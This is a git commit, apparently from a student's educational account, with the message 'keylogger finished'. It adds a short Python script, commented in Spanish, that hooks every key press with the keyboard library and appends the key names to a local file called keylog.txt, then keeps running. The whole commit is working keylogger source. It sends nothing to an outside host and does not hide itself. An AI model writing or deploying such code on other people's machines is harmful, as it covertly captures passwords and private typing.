344091e5aabaa2b2266001b0b279aa9c9760f31b
Olopper <olopper2407@g.educaand.es>
2025-01-29 13:09:14 +0100

    keylogger finished

---
+++ keylogger.py
@@ -0,0 +1,17 @@
+import keyboard  
+
+
+# Es la función que se encarga de guardar dichas teclas en el archivo.
+def imprimir_tecla(key):
+
+    with open("keylog.txt", "a") as file:
+
+        if key.name == "space":
+            file.write(" ")
+        else:
+            file.write(key.name)
+# Acción para que se quede registrada la tecla pulsada.
+keyboard.on_press(imprimir_tecla)
+# Permite al keylogger seguir ejecutandose.
+keyboard.wait()
+
